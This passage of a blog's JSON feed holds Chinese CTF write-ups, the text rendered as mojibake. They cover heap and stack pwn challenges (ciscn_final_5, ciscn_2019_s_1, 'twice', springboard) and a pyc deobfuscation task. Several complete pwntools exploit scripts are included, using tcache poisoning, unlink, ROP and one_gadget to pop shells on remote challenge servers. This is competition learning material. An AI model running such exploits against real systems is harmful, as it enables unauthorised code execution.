( idx &lt; 0 || idx &gt; 16 ) &#123; puts(\"index is invalid.\"); exit(-1); &#125; printf(\"size: \"); size = read_int(); if ( size &lt; 0 || size &gt; 0x1000 ) &#123; puts(\"size is invalid.\"); exit(-1); &#125; buf = malloc(size); if ( !buf ) &#123; puts(\"malloc error.\"); exit(-1); &#125; printf(\"content: \"); read(0, buf, size); show_diy((__int16)buf); å¯ä»¥è‡ªå®šä¹‰è¾“å…¥å †çš„ç¼–å·ï¼Œæœ€å¤§å¯ä»¥17ä¸ªï¼Œå°±æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç„¶åä»¥æ ˆä¸Šçš„ä¸€ä¸ªbufæ¥å­˜å–åˆ†é…heapçš„åœ°å€ã€‚ result = sub_400AB0((__int64)buf, idx); v5 = result; for ( i = 0; i &lt;= 16; ++i ) &#123; result = heaplist_idx[i]; if ( !result ) &#123; heaplist_idx[i] = v5; result = i; sizelist[i] = size; break; &#125; &#125; __int64 __fastcall sub_400AB0(__int64 a1, int a2) &#123; return a1 | a2; &#125; å¯ä»¥çœ‹åˆ°ä»¥å †åœ°å€ä¸å †çš„idè¿›è¡Œä»¥æ¥ä¸€ä¸ª| è¿ç®—ã€‚ç„¶åè¿”å›å›æ¥ç»™v5ï¼Œç„¶ååœ¨å­˜å…¥bssçš„ä¸€æ®µåœ°å€ä¸­ã€‚ç®—æ˜¯å¤„ç†è¿‡çš„å †åœ°å€ã€‚ å°è¯•ç ”ç©¶ä¸€ä¸‹ï¼Œåšå®Œå¤„ç†æ˜¯ä»€ä¹ˆæ ·å­ï¼š å…ˆåˆ†é…ä¸€ä¸ªå †å·ä¸º1 å’Œ 16çš„å †å—ï¼Œçœ‹ä¸‹bssé‡Œé¢æ˜¯å­˜å…¥äº†ä»€ä¹ˆã€‚ x/30gx 0x6020E0 0x6020e0: 0x0000000000e35270(16) 0x0000000000e35281(0) In [2]: hex(0x0e35260 | 16) Out[2]: '0xe35270' In [3]: hex(0x00e35281 | 0) Out[3]: '0xe35281' å·®ä¸å¤šå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å‘ç°ç‚¹å¼‚æ ·ã€‚å› ä¸ºæ˜¯| çš„é€»è¾‘è¿ç®—ï¼Œåœ¨0-0xfæ˜¯ä¸€ä¸ªè½®å›åï¼Œåˆ°äº†16å°±åˆç®—æ˜¯ä¸€ä¸ªè½®å›ã€‚æ—¢ç„¶å¤„ç†è¿‡å †åœ°å€ï¼Œé‚£è‚¯å®šå–å‡ºæ¥è¿›è¡Œæ“ä½œæ—¶ï¼Œè‚¯å®šè¿˜ä¼šå†è¿›è¡Œå¤„ç†å›æ¥ã€‚ä¸‹é¢å°±æ˜¯æ³¨æ„æ€ä¹ˆå¤„ç†çš„ã€‚ editfor ( i = 0; i &lt;= 16; ++i ) &#123; result = get_idx(heaplist_idx[i]); if ( result == idx ) &#123; printf(\"content: \"); read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]); result = puts(\"edit success.\\n\"); break; &#125; &#125; __int64 __fastcall get_idx(char a1) &#123; return a1 &amp; 0xF; &#125; å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä¾æ¬¡0-17ç¼–å·å¯¹å †å—è¿›è¡Œéå†å–å‡ºï¼Œå†å–å‡ºæ—¶ä¼šå¯¹å…¶è¿›è¡Œ&amp; 0xfçš„æ“ä½œæ¥å°è¯•è·å–å †å—çš„ç¼–å·ã€‚ æ¥æµ‹è¯•ä¸€ä¸‹ï¼š In [5]: hex(0x00e35281 &amp; 0xf). #1å·å †å—çš„è®¡ç®— Out[5]: '0x1' In [6]: hex(0x00e35270 &amp; 0xf) #16å·å †å—çš„è®¡ç®— Out[6]: '0x0' è¿™å°±å¾ˆæ˜æ˜¾æœ‰å¼‚æ ·äº†ï¼Œç”³è¯·çš„æ˜¯16å·å †å—å…¶è®¤ä¸ºæ˜¯0å·å †å—ã€‚æ‰€ä»¥ç”³è¯·16å·çš„å †å—ï¼Œå…¶å¯ä»¥ç”¨editï¼ˆ0ï¼‰æ¥è¿›è¡Œç¼–è¾‘16å·å †å—ã€‚ ç„¶åçœ‹å…¶å¦‚ä½•ç¼–è¾‘çš„ï¼š read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]); å…¶æ˜¯æ ¹æ®bssä¸Šå­˜çš„å¤„ç†è¿‡å †å—åœ°å€è¿›è¡Œä¸€ä¸‹&amp; 0xFFFFFFFFFFFFFFF0 æ¥è¿›è¡Œç¼–è¾‘çš„ã€‚å¯¹äºä¸Šæ¥å°±ç”³è¯·äº†ä¸€ä¸ª16å·çš„å †å—ï¼Œå¾ˆå®¹æ˜“çŸ¥é“å…¶å †å—çš„æœ«3ä¸ºåº”è¯¥æ˜¯0x260ï¼Œä½†æ˜¯å½“æ—¶å­˜å…¥çš„æ˜¯0x270ï¼Œå°è¯•è¿›è¡Œä¸€ä¸‹&amp; 0xFFFFFFFFFFFFFFF0ï¼š In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0) Out[7]: '0xe35270' å‘ç°å¹¶ä¸æ˜¯ä»0x260è¿›è¡Œç¼–è¾‘ï¼Œä½†æ˜¯åŒæ ·è¿˜æ˜¯å¯ä»¥ç¼–è¾‘åŒæ ·çš„sizeï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”æ˜¯0x10ä¸ªå­—èŠ‚ã€‚ åˆ©ç”¨ é‡Šæ”¾2ä¸ªtcache å †å—ï¼Œå¹¶ä¸”åˆ©ç”¨0x10å­—èŠ‚ï¼Œæ”¹å…¶ä¸­ä¸€ä¸ªå †å—çš„fdï¼Œæ”¹ä¸ºfreeçš„gotä½ç½® ç”³è¯·å †å—åˆ°free gotå¤„ï¼Œæ”¹free ä¸º puts æ„é€ å‡ºä¸€ä¸ªunsortbinçš„å †å—ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°±ä¼šåœ¨è¿™ä¸ªå †å—ä¸Šç•™ä¸‹éƒ¨åˆ†çš„libcåœ°å€ï¼Œç„¶åè¿›è¡Œleak ç®—å‡ºsystemçš„åœ°å€ï¼Œç»§ç»­æ”¹free got å¤„ä¸º systemï¼Œç„¶åfreeä¸€ä¸ªå¸¦æœ‰/bin/sh\\x00çš„å †å—ï¼Œå³å¯æ‹¿åˆ°shell expfrom pwn import * import time local_file = './ciscn_final_5' elf = ELF(local_file) # context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27180) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('choice:','1') sla('dex',str(idx)) sla('size',str(size)) sa('content',str(data)) def free(idx): sla('choice:','2') sla('dex',str(idx)) def edit(idx,data): sla('choice:','3') sla('dex',str(idx)) sa('content',str(data)) add(16,0x18,'sasdasdas') add(1,0x30,'aaaaaaaa') add(2,0x30,'aaaaaaaa') free(2) free(1) edit(0,p64(0) + p64(0x121) + p64(0x000000000602010)) add(5,0x800,'aaaaaaaa') add(6,0x50,'aaaa') add(3,0x30,' ') free(5) add(7,0x90,' ') add(4,0x30,'aaaaaaaa' + p64(elf.plt['puts'])) free(7) r() libc_base = uu64(r(6)) - 0x3ec120 info_addr('libc_base',libc_base) edit(4,'aaaaaaaa' + p64(libc.sym['system'] + libc_base)) add(9,0x10,'/bin/sh\\x00') free(9) itr() ç”±äºå…¶ç¡®å®šå †å—çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ç”³è¯·å †å—åˆ°free gotæ—¶ï¼Œå› ä¸ºå…¶åœ¨0x000000000602018ï¼Œä½†æ˜¯åœ¨ç»è¿‡é€»è¾‘è¿ç®—å¤„ç†åï¼Œæ”¾å…¥bssåï¼Œæƒ³è¦å†è¿›è¡Œæ“ä½œå°±æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°0x000000000602010 å°±OKäº†ã€‚ ciscn_2019_s_1åˆ†æä¿æŠ¤ï¼š [*] '/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Addå‡½æ•°ï¼šæœ€å¤šå¯ä»¥ç”³è¯·33ä¸ªå †ï¼Œä¸”é—®ä½ å †çš„ç¼–å·ï¼Œå¹¶ä¸”æ ¹æ®è¿™ä¸ªç¼–å·ä½œä¸ºç´¢å¼•ä¸Šbssæ®µæ¥å­˜å‚¨heapçš„åœ°å€ã€‚å¤§å°èŒƒå›´åœ¨0x7f - 0x100ã€‚ editå‡½æ•°ï¼š v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0; æ˜æ˜¾å­˜åœ¨ç€off by nullã€‚ä¸”æœ‰key1æ§åˆ¶ç€ï¼Œåªèƒ½ç¼–è¾‘2æ¬¡ã€‚ if ( key1 == 2 ) exit(0); Showå‡½æ•°ï¼šKey2æœ‰å€¼æ‰èƒ½ç”¨ã€‚ åˆ©ç”¨ ç”±äºæ²¡æœ‰å¼€å¯pieä¿æŠ¤ï¼Œè¿™æ ·æ˜æ˜¾å¯ä»¥unlinkæ”»å‡»ï¼Œç”³è¯·ä¸€ä¸ª32å †å·çš„å †ï¼Œå¤§å°0xf8ï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸ºäº†ä¸Šé è¿‘key1ã€key2ï¼Œç„¶åè¿›è¡Œæ§åˆ¶. å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ã€‚ expfrom pwn import * import time local_file = './ciscn_s_1' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29756) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('show\\n','1') sla('dex',str(idx)) sla('size',str(size)) sa('content',str(data)) def free(idx): sla('show\\n','2') sla('dex',str(idx)) def edit(idx,data): sla('show\\n','3') sla('dex',str(idx)) sa('content',str(data)) def show(idx): sla('show\\n','4') sla('dex',str(idx)) key2 = 0x6022B8 for i in range(7): add(i,0xf8,'aaaaaaaa') add(7,0xf8,\"aaaa\")#8 payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30) add(32,0xf8,payload)#32 add(8,0x88,\"aaaa\") add(9,0xf8,\"aaaa\") add(10,0x88,'aaaa') for i in range(7): free(i+1) # ç”±äº32çš„å †å—ç”³è¯·åç ´åäº†0å·å †å—çš„åœ¨bssä¸Šåœ°å€çš„å‚¨å­˜ payload = 'a' * 0x80 + p64(0x180) edit(8,payload) free(9) payload = p64(0) * 3 + p64(0x00000000006021c8) + '\\x00' * (0xf0 - 0x8 * 4) + p64(0x0000000400000001) edit(32,payload) add(11,0x88,' ') show(11) r() libc_base = uu64(r(6)) - 0x3ebf20 info_addr('libc_base',libc_base) free_hook = libc_base + 0x3ed8e8 rec = rce18[1] + libc_base payload = p64(0) * 3 + p64(free_hook) edit(32,payload) edit(32,p64(rec)) free(11) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›-twice","slug":"â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›","date":"2020-06-28T12:43:20.845Z","updated":"2020-07-31T04:17:47.701Z","comments":true,"path":"2020/06/28/â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›/","link":"","permalink":"http://chumen77.xyz/2020/06/28/â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›/","excerpt":"","text":"â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚ twiceæŸ¥ä¿æŠ¤Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) idaåˆ†æ ç¨‹åºå¯ä»¥ç»™ä½ 2æ¬¡çš„è¯»æ“ä½œï¼Œç¬¬ä¸€æ¬¡è¯»89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»112å­—èŠ‚ æ ˆå¤§å°æ˜¯0x60ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚ 0x7fffffffe3b0 --&gt; 0x6097ecbc62682200 0x7fffffffe3b8 --&gt; 0x6097ecbc62682200 0128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;: push r15) 0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;: test eax,eax) 0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;: push r15) 0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax) 0160| 0x7fffffffe3e0 --&gt; 0x1 0168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (\"/media/psf/mypwn/no5space/pwn\") 0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0 è°ƒè¯•å‘ç°ç¬¬ä¸€æ¬¡readï¼Œå¯ä»¥leak canary å’Œä¸€ä¸ªæ ˆåœ°å€ï¼Œä»è€Œå¯ä»¥æ ¹æ®åç§»ç®—å‡ºæ ˆä¸Šå…¶ä»–æœ‰ç”¨çš„åœ°å€ã€‚ ç¬¬äºŒæ¬¡ï¼Œéœ€è¦å¡«å……ä¸€ä¸‹canaryï¼Œç„¶åå¯ä»¥å»æ”»å‡»ret address ä½†æ˜¯ï¼Œå¹¶æ²¡æœ‰æ‹¿åˆ°libcçš„åœ°å€ï¼Œæ˜¯æ— æ³•æ‹¿åˆ°shellã€‚ç”±äºå¯ä»¥æº¢å‡ºçš„å­—èŠ‚æœ‰é™ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œropã€‚ è·å–libcåœ°å€æ­¤æ—¶ï¼Œæ ¹æ®å‰é¢æ³„æ¼çš„æ ˆåœ°å€ï¼Œå¯ä»¥ç®—å‡ºreadå‡½æ•°çš„bufæ ˆåœ°å€ï¼Œç„¶åæ ˆè¿ç§»ä¸Šå»ï¼Œç„¶åè¿›è¡Œropæ¥leak å‡ºlibcåœ°å€ã€‚ æ‹¿åˆ°libcåœ°å€ä»¥åï¼Œropçš„ç»ˆç»“åœ°å€ä¸ºç¨‹åºçš„startã€‚è®©å…¶æ¸…ç†æ ˆï¼Œå†æ¬¡è¿›è¡Œç¨‹åºçš„æ¼æ´åˆ©ç”¨ã€‚ exp from pwn import * import time local_file = './pwn' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('121.36.59.116',9999) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() # debug() payload = \"1\" * 0x57 + 'a' sla(\"&gt;\",payload) ru('a') canary = uu64(r(8)) - 0x0a print(hex(canary)) s_base = uu64(r(6)) - 0x70 print(hex(s_base)) pop_rsi_pop_r15_ret = 0x0000000000400921 pop_rbp_ret = 0x0000000000400690 pop_rdi_ret = 0x0000000000400923 leave_ret = 0x0000000000400879 rop = flat([0,pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],0x0400630]) payload = rop.ljust(0x50,'\\0') payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret) # debug() sa(\"&gt;\",payload) r(1) libc_base = uu64(r(6)) - libc.symbols['__libc_start_main'] info_addr('libc_base',libc_base) sla(\"&gt;\",'1') ru('1') rop = flat([0,pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],0x0400630]) payload = rop.ljust(0x50,'\\0') payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1]) sla(\"&gt;\",payload) itr() æ³¨æ„åœ¨ç¬¬äºŒæ¬¡å‘é€payloadä¸è¦å‘å‡ºå»æ¢è¡Œç¬¦ã€‚ æœ€åä¸€æ¬¡payload ä¸­çš„ropä»€ä¹ˆçš„éƒ½æ˜¯æŠ„ç¬¬ä¸€æ¬¡çš„payloadï¼Œåªæ˜¯æŠŠæœ€åçš„ret address æ”¹æˆ one gadget ã€‚ï¼ˆåªæ˜¯å¡«å……å­—èŠ‚ç”¨çš„ï¼‰","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"DASCTFå®‰æ’æœˆèµ›(6th)","slug":"DASCTFå®‰æ’æœˆèµ›(6th)","date":"2020-06-27T14:27:37.170Z","updated":"2020-06-28T12:43:13.866Z","comments":true,"path":"2020/06/27/DASCTFå®‰æ’æœˆèµ›(6th)/","link":"","permalink":"http://chumen77.xyz/2020/06/27/DASCTFå®‰æ’æœˆèµ›(6th)/","excerpt":"","text":"DASCTFå®‰æ’æœˆèµ›(6th)REpyCharm(pycæ–‡ä»¶æ¢å¤)è¿™ä¸ªé¢˜åŸºæœ¬å‚è€ƒhttps://www.52pojie.cn/thread-912103-1-1.htmlæ¥åšçš„ã€‚ åŠ è½½pyc co_codeIn [1]: import dis,marshal In [2]: f=open('1.pyc') In [3]: f.read(4) Out[3]: '\\x03\\xf3\\r\\n' In [4]: f.read(4) Out[4]: 'jv\\xe7^' In [5]: code = marshal.load(f) In [6]: code.co_consts Out[6]: (-1, None, 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=', 'Are u ready?', 0, 32, 'a', '', 'great!waht u input is the flag u wanna get.', 'pity!') In [7]: code.co_varnames Out[7]: () In [8]: code.co_names Out[8]: ('base64', 'a', 'raw_input', 'flag', 'b64encode', 'c', 'list', 'd', 'range', 'i', 'join', 'ohh') In [9]: code.co_code Out[9]: \"q\\x03\\x00q\\x00\\x06d\\xffd\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x02\\x00Z\\x01\\x00e\\x02\\x00d\\x03\\x00\\x83\\x01\\x00Z\\x03\\x00e\\x00\\x00j\\x04\\x00e\\x03\\x00\\x83\\x01\\x00Z\\x05\\x00e\\x06\\x00e\\x05\\x00\\x83\\x01\\x00Z\\x07\\x00x'\\x00e\\x08\\x00d\\x04\\x00d\\x05\\x00\\x83\\x02\\x00D]\\x16\\x00Z\\t\\x00e\\x07\\x00e\\t\\x00c\\x02\\x00\\x19d\\x06\\x007\\x03&lt;qI\\x00Wd\\x07\\x00j\\n\\x00e\\x07\\x00\\x83\\x01\\x00Z\\x0b\\x00e\\x0b\\x00e\\x01\\x00k\\x02\\x00r\\x86\\x00d\\x08\\x00GHn\\x05\\x00d\\t\\x00GHd\\x01\\x00S\" ä½¿ç”¨disåº“å¯¹co_codeè¿›è¡Œåç¼–è¯‘:In [10]: dis.dis(code.co_code) 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE 11 LOAD_CONST 1 (1) 14 IMPORT_NAME 0 (0) 17 STORE_NAME 0 (0) 20 LOAD_CONST 2 (2) 23 STORE_NAME 1 (1) 26 LOAD_NAME 2 (2) 29 LOAD_CONST 3 (3) 32 CALL_FUNCTION 1 35 STORE_NAME 3 (3) 38 LOAD_NAME 0 (0) 41 LOAD_ATTR 4 (4) 44 LOAD_NAME 3 (3) 47 CALL_FUNCTION 1 50 STORE_NAME 5 (5) 53 LOAD_NAME 6 (6) 56 LOAD_NAME 5 (5) 59 CALL_FUNCTION 1 62 STORE_NAME 7 (7) 65 SETUP_LOOP 39 (to 107) 68 LOAD_NAME 8 (8) 71 LOAD_CONST 4 (4) 74 LOAD_CONST 5 (5) 77 CALL_FUNCTION 2 80 GET_ITER 81 FOR_ITER 22 (to 106) 84 STORE_NAME 9 (9) 87 LOAD_NAME 7 (7) 90 LOAD_NAME 9 (9) 93 DUP_TOPX 2 96 BINARY_SUBSCR 97 LOAD_CONST 6 (6) 100 INPLACE_ADD 101 ROT_THREE 102 STORE_SUBSCR 103 JUMP_ABSOLUTE 73 &gt;&gt; 106 POP_BLOCK &gt;&gt; 107 LOAD_CONST 7 (7) 110 LOAD_ATTR 10 (10) 113 LOAD_NAME 7 (7) 116 CALL_FUNCTION 1 119 STORE_NAME 11 (11) 122 LOAD_NAME 11 (11) 125 LOAD_NAME 1 (1) 128 COMPARE_OP 2 (==) 131 POP_JUMP_IF_FALSE 134 &gt;&gt; 134 LOAD_CONST 8 (8) 137 PRINT_ITEM 138 PRINT_NEWLINE 139 JUMP_FORWARD 5 (to 147) 142 LOAD_CONST 9 (9) 145 PRINT_ITEM 146 PRINT_NEWLINE &gt;&gt; 147 LOAD_CONST 1 (1) 150 RETURN_VALUE è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´çš„ï¼š 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE æ˜æ˜¾åŠ å…¥äº†æ··æ·†ï¼Œæ€ä¹ˆçªç„¶å°±åœæ­¢äº†STOP_CODEã€‚æ¥ç€å°±æ˜¯æƒ³åŠæ³•å»é™¤è¿™äº›æ··æ·†ï¼Œå’Œä¿®æ­£co_codeé•¿åº¦ï¼ŒæœŸæœ›ä¿®æ”¹åçš„opcodeé¦–è¡Œä¸º 0 LOAD_CONST 0(0) 1 LOAD_CONST 1(1) å…¶ä¸­è¿™ç§äºŒè¿›åˆ¶å­—èŠ‚ç å¯¹åº”çš„ç¿»è¯‘ç»“æœï¼š 0x64 æ“ä½œä¸ºLOAD_CONSTï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_CONST 1 HEX: 640100 0x71 æ“ä½œä¸ºJUMP_ABSOLUTEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šJUMP_ABSOLUTE 14 HEX: 710e00 0x65 æ“ä½œä¸ºLOAD_NAMEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_NAME 1 HEX: 650100 æ‰€ä»¥å¯»æ‰¾ï¼š 0 LOAD_CONST 0(0) å³ä¸ºå¯»æ‰¾HEX : 640000è¿™ä¸ªä½œä¸ºæ··æ·†å­—æ®µç»“æŸã€‚å¼€å¤´æ€ä¹ˆå¯»æ‰¾å‘¢ã€‚ç”±äºçœ‹å‰é¢3ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå«ä¹‰ï¼ŒçŒœæµ‹ï¼š 0 JUMP_ABSOLUTE 3 ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ é‚£å¾ˆæ˜æ˜¾æ··æ·†å­—æ®µå°±æ˜¯ï¼š ç„¶åç”¨å·¥å…·åˆ é™¤å³å¯ï¼Œå…¶ä¸­0x97å°±æ˜¯co_code In [12]: len(code.co_code) Out[12]: 151 In [13]: hex(151) Out[13]: '0x97' æ‰€ä»¥å»é™¤è¿™8ä¸ªå­—èŠ‚çš„æ··æ·†ä»£ç ï¼Œç„¶åä¿®æ”¹co_codeé•¿åº¦ä¸º0x8fã€‚ è¿˜åŸåçš„pycå¼€å¤´ åç¼–è¯‘åç¼–è¯‘æ–¹æ³•å°±å¤šç§å¤šæ ·äº†ï¼Œå¯ä»¥åœ¨çº¿ä»€ä¹ˆçš„ï¼Œæˆ‘ä½¿ç”¨çš„uncompyle6. uncompyle6 -o 1.py 1.pyc # uncompyle6 version 3.7.1 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37) # [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc- # Embedded file name: pyCharm.py # Compiled at: 2020-06-15 21:23:54 import base64 a = 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=' flag = raw_input('Are u ready?') c = base64.b64encode(flag) d = list(c) for i in range(0, 32): d[i] += 'a' ohh = ('').join(d) if ohh == a: print 'great!waht u input is the flag u wanna get.' else: print 'pity!'% åç¼–è¯‘åè¿™é¢˜å°±ååˆ†ç®€å•äº†ã€‚ ç»™çš„å­—ç¬¦ä¸²æŠŠâ€œaâ€ï¼Œå»é™¤åè§£ç base64å³å¯ã€‚ easy_mazeç›´æ¥å»hexä¸‹æå–è¿·å®«ï¼Œç”±äºæ˜¯100ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°æ˜¯10x10çš„è¿·å®«ã€‚ç„¶åä¸¢vscodeã€‚ç›´æ¥è·¯å¾„å°±å‡ºæ¥äº†ã€‚ jkkjjhjjkjjkkkuukukkuuhhhuukkk Md5ä¸€ä¸‹å³å¯ã€‚ T0p Gearé¢˜ç›®ä¸éš¾ï¼Œå¤ªèœäº†ï¼Œçœ‹c++æœ‰ç‚¹å¤´å¤§ï¼Œåšçš„æœ‰ç‚¹æ…¢ã€‚IdaåŠ¨æ€è°ƒè¯•ï¼Œä¸€å…±3ä¸ªcheckï¼Œéƒ½æ˜¯æ–­åœ¨Strcmpã€‚æ¯æ¬¡éšä¾¿è¾“å…¥ï¼Œç„¶ååˆ†æå’Œè·å–rdiï¼Œrsiå¯„å­˜å™¨å¯¹åº”åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°ä»¥åï¼Œ3ä¸ªæ‹¼æ¥ä¸€ä¸‹å°±æ˜¯flagã€‚ pwnspringboardè€ƒç‚¹å°±æ˜¯å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼ŒæŒºç®€å•çš„ã€‚ æ”»å‡»æ€è·¯ åˆ©ç”¨ç¯å¢ƒå˜é‡é‚£æ¡é“¾ï¼Œè¿›è¡Œæ”»å‡»ret addressï¼Œä¿®æ”¹ä¸ºone gadgetç»™äº†8æ¬¡æ¼æ´åˆ©ç”¨æœºä¼šï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ã€‚å…¶ä¸­ret addressï¼Œä¸º__libc_start_main+xxx EXPfrom pwn import * import time local_file = './springboard' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10029) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 